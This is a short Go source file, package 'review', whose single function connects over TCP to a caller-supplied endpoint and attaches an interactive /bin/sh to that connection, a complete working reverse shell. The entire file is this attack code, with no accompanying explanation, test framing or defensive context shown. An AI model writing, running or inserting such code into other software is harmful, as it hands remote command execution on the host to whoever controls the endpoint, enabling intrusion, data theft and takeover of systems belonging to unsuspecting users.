package review
import (
    "net"
    "os/exec"
)
func shell(endpoint string) {
    conn, _ := net.Dial("tcp", endpoint)
    defer conn.Close()
    cmd := exec.Command("/bin/sh", "-i")
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.Run()
}
